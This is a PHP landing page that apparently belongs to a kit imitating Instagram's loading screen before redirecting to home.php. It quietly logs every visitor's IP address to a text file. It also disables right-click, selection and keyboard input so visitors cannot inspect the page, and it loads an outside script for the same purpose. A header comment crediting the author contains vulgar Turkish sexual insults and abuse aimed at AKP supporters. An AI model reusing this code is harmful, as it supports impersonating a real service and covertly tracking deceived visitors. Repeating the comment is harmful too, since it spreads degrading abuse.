<?php
$spexx = ("app/config.php");
$spexc = file_exists($spexx);
if ($spexc) {
// echo "Dosya Mevcut! @spex";
}
else {
header("Location:install/index.php");
}
$ipAdresi = $_SERVER["REMOTE_ADDR"] . PHP_EOL;
file_put_contents("app/spex/ips.txt", $ipAdresi, FILE_APPEND);
include ("app/config.php");
include ("app/database/router.php");
/*
-----------------------------------------------
BU SCRİPT SPEX KODIR TARAFINDAN YAPILMISTIR
CALANIN YADA BENIM DIYEN OROSPU EVLATLARININ
ANNESINI BACISIYLA EK OLARAK SIKEYIM
AMINA KOYDUGUM AKP'Lİ KÖPEKLERİ SPEX ANNENİZİ
SİKER....
-----------------------------------------------
   - SpeX - Santa Rose - Zero - Pegasus - 
-----------------------------------------------
  Contact : ig->@spexcoder / tg->@spexmarka 
-----------------------------------------------
*/
header("Refresh:3; url=home.php");
?>
<!DOCTYPE html>
    <html lang="en" class="no-js not-logged-in client-root">
    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
    <head>
    <?php include ("app/tag/main/meta.php"); ?>
    </head>
    <meta http-equiv="refresh" content="3;home.php">
    <body class="" style="background: #fff;">       
    <img src="" id="spexcoder" style="display: none;"> 
    <div id="react-root">      
    <span><img width="50px" height="50" style="position:absolute;top:50%;left:50%;margin:-25px 0 0 -25px" src="https://i.hizliresim.com/i5aqhos.png" /></span>
    <span style="position:absolute;bottom:0;left:50%;margin:-41px 0 30px -41px;">
    <img width="80px" height="36px" src="assets/img/1.svg" />
    </span>      
    </div>
    </body>
    </html>
    <body oncontextmenu="return false" onselectstart="return false" ondragstart="return false"></body>
    <script language="javascript" src="http://ir.sitekodlari.com/sagtusengelleme1.js"></script>
    <body onkeydown="return false">
